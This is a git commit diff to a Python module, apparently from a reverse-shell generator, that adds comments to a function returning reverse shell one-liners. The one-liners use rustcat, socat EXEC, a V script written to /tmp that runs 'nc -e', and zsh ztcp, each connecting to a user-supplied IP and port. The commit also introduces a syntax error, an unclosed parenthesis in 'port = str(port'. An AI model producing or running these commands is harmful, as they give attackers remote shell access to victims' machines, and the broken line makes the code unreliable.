a5c122c53459cf4507343ba0734d29d1c9ed6631
tomasilluminati <147225560+tomasilluminati@users.noreply.github.com>
2023-10-18 20:19:17 -0300

    Update rev_shells_3.py

--- modules/rev_shells_3.py
+++ modules/rev_shells_3.py
@@ -1,5 +1,10 @@
+# Define a function to generate reverse shell commands based on user inputs
 def rev_shells_3(num, ip, port, shell):
-    
+
+    # Convert the port to a string
+    port = str(port
+
+    # Define different reverse shell commands for various languages
     rustcat = f'''rcat connect -s {shell} {ip} {port}'''
     socat_1 = f"socat TCP:{ip}:{port} EXEC:{shell}"
     socat_2 = f"socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane"
@@ -8,6 +13,8 @@ def rev_shells_3(num, ip, port, shell):
     vlang = '''echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e '''+shell+''' '''+ip+''' '''+port+''' 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v'''
     zsh = f"zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && {shell} >&$REPLY 2>&$REPLY 0>&$REPLY'"
 
+
+    # Select and return the appropriate reverse shell command based on user input
     if num == 57:
         return rustcat
     elif num == 58:
